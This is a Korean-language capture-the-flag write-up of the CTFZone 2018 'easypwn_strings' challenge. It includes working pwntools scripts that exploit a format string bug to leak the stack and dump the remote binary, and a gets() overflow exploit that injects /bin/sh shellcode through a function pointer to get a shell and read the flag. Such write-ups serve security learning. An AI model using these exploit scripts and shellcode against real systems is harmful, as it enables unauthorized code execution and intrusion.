---
layout: post
title: "[CTFZone 2018] easypwn_strings Write-up"
image: /img/ctfzone_2018.png
tags: [CTF, write-up, pwnable]
---

## 요약
`pwnable` `FSB`

---
### Vuln

> nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234

```
Let's choose string operation!
	1. StrLen
	2. SubStrRemove
	3. StrRemoveLastSymbols
```
1번 메뉴를 선택하고 문자열을 입력하면 문자열의 길이가 출력되고, 3번 메뉴를 선택하고 문자열과 숫자를 입력하면 해당 문자열의 뒤에서 입력한 숫자 만큼을 잘라서 출력해준다. 2번 메뉴는 구현되어 있지 않았다.
```
You choise - 3
	Use str int
	good choise
	Set string:
%x
	Set number:
0
	Delete 0 ending symbols
	Result:
ff906700
```
3번 메뉴에서 문자열을 출력할 때 `포맷 스트링 버그 (FSB)` 가 발생한다.
<br><br><br>

### Solve
포맷 스트링 버그를 이용해서 스택에 있는 값들을 출력한다.
```python
from pwn import *

for j in range(0, 20):
        r = remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)

        r.recvuntil('StrRemoveLastSymbols')
        r.recvuntil('\n')
        r.sendline('3')
        r.recvuntil(':')
        r.recvuntil('\n')

        test = ''
        for i in range(j*20,j*20+20):
                test += '%%%d$p.' % i

        print test
        r.sendline(test)
        r.recvuntil(':')
        r.sendline('0')
        r.recvuntil(':')
        r.recvuntil('\n')
        d = r.recvuntil('\n')
        print d
```
```
[+] Opening connection to pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one on port 1234: Done
%200$p.%201$p.%202$p.%203$p.%204$p.%205$p.%206$p.%207$p.%208$p.%209$p.%210$p.%211$p.%212$p.%213$p.%214$p.%215$p.%216$p.%217$p.%218$p.%219$p.
0x80496d4.0xf77b7000.0xffeac818.0x8048e07.0x1.0xffeac8c4.0x3.0x33.0xf77b73dc.0xffeac830.(nil).0xf761d637.0xf77b7000.0xf77b7000.(nil).0xf761d637.0x1.0xffeac8c4.0xffeac8cc.(nil).
```
출력 된 값들을 살펴보면 0x80496d4 나 0x8048e07 과 같이 코드 영역의 주소로 보이는 값들을 발견할 수 있었고, 이를 토대로 <span style="color:#cf3030">0x8048000</span> 을 <span style="color:#cf3030">base address</span> 로 설정하여 바이너리 덤프를 시도했다.
<br>
그 결과는 다음과 같다.
```
0000000: 0045 4c46 0101 0100 0000 0000 0000 0000  .ELF............
0000010: 0200 0300 0100 0000 2086 0408 3400 0000  ........ ...4...
0000020: 6c3b 0000 0000 0000 3400 2000 0700 2800  l;......4. ...(.
0000030: 2000 1d00 0600 0000 3400 0000 3480 0408   .......4...4...
0000040: 3480 0408 e000 0000 e000 0000 0500 0000  4...............
0000050: 0400 0000 0300 0000 1401 0000 1481 0408  ................
...
```
ELF 시그니쳐로 보이는 `00(7F)45 4c46` 로 시작된다. 이렇게 쭉 덤프를 뜨면 되는데 중간에 null 바이트가 많아서 너무 오래걸린다. ELF 헤더 중 0x18 오프셋 부분을 보면 <span style="color:#cf3030">0x08048620</span> 이라는 값이 쓰여있는데 이 값이 <span style="color:#cf3030">엔트리 포인트</span>의 메모리 주소이다.<br>
이 주소를 시작으로 코드 섹션만 덤프 떠올 수 있다.
```python
from pwn import *

def conn():
        return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)

def dump(adr,frmt='p'):
        r.recvuntil('StrRemoveLastSymbols')
        r.recvuntil('\n')
        r.sendline('3')
        r.recvuntil(':')
        r.recvuntil('\n')

        leak_part = "|%19${}|".format(frmt)
        out = leak_part.ljust(4*10,"A")+"EOF_"+p32(adr)
        r.sendline(out)
        r.sendline('0')
        r.recvuntil('Result:')
        return r.recvuntil("|A")[:-2].split("|")[1]

        start_addr = 0x8048620

        while True:
                try:
                        fd = open("dumped_file","a")
                        r = conn()
                        data = dump(start_addr,'s')
                        print "|0x%08x|%s|" % (start_addr,data)
                        if data == "(null)" or data == "":
                                fd.write("\x00")
                                start_addr += 1
                        else:
                                fd.write(data+"\x00")
                                start_addr += len(data)+1
                        fd.close()
                except:
                        print "[!] execption"
                        break
```
<br>

<center><img src="/img/ctfzone_easypwn_1.PNG" class="effect"></center>

덤프 뜬 바이너리를 IDA로 열어보면 `1, 2, 3` 메뉴 외에 `X, T, S` 라는 메뉴가 있는 것을 확인 할 수 있다. 하나씩 사용해보면 되는데 그 중에서도 `T` 메뉴를 사용하면 바이너리와 라이브러리를 다운 받을 수 있는 링크를 알려준다.. 개꿀
```
Let's choose string operation!
	1. StrLen
	2. SubStrRemove
	3. StrRemoveLastSymbols
	T
You choise - T
	Cheat ^^
	Are you surprised?? (y or n)
y
https://ctf.bi.zone/files/babypwn
https://ctf.bi.zone/files/babylibc
```
<br>

이제 IDA로 다시 분석!

<img src="/img/ctfzone_easypwn_2.PNG" class="effect">

처음엔 `S` 를 수상하게 보고 포맷 스트링 버그를 이용해서 0x80493E0 의 값을 조작하려고 했지만 메뉴 하나를 실행시키면 프로그램이 끝나는 구조라서 그럴 수 없었다. 대신 `X` 혹은 `T` 메뉴를 사용 했을 시 `gets()` 함수를 통해서 `overflow` 가 발생한다. 0x80492E0 에 값을 쓸 수 있는데, 그 뒤쪽에 있는 0x80493E0 이 <span style="color:#cf3030">함수 포인터</span>로 사용된다. 0x80492E0 에 쉘 코드를 올리고 overflow 를 발생시켜 0x80493E0 을 쉘 코드의 주소로 바꿔주면 끝! (rwx 권한이 있었다)
<br>

```python
from pwn import *

def conn():
	return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)

shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

r = conn()
r.sendline("T")
r.sendline(("y"+shellcode).ljust(256,"\x90")+p32(0x80492e0+1))

r.interactive()

```
```
Let's choose string operation!
    1. StrLen
    2. SubStrRemove
    3. StrRemoveLastSymbols
 You choise - T
    Cheat ^^
    Are you surprised?? (y or n)
$ ls
flag.txt
main.c
strings
strings.sh
$ cat flag.txt
ctfzone{e4$Y_pVVn_$Tr1№6_Fu№C}
```
ctfzone{e4$Y_pVVn_$Tr1№6_Fu№C}
<br>

### Ref
https://www.youtube.com/watch?v=XuzuFUGuQv0
https://ko.wikipedia.org/wiki/ELF_%ED%8C%8C%EC%9D%BC_%ED%98%95%EC%8B%9D
